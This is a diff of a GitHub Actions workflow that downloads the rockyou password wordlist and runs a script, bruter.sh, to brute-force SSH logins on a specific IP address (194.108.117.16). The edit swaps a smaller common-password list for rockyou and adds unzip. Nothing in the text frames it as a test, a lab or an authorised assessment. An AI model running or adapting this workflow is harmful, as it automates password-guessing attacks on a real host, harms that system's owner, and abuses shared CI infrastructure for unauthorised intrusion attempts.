@@ -18,7 +18,7 @@ jobs:
     - name: Download files
       run: |
         sudo apt update
-        sudo apt install nmap wget -y
+        sudo apt install nmap wget unzip -y
         mkdir -p downloads
         cd downloads
         
@@ -35,11 +35,13 @@ jobs:
 
     - name: Download Password
       run: |
-        wget -O passwords.txt https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt
+        # wget -O passwords.txt https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt
+        wget -O rockyou.zip https://github.com/RykerWilder/rockyou.txt/raw/refs/heads/main/rockyou.txt.zip
+        unzip rockyou.zip
 
     - name: Scanning in progress 
       run: |
-         bash bruter.sh ssh user.txt passwords.txt 194.108.117.16 output.log
+         bash bruter.sh ssh user.txt rockyou.txt 194.108.117.16 output.log
 
     - name: Determine release tag
       id: get_tag
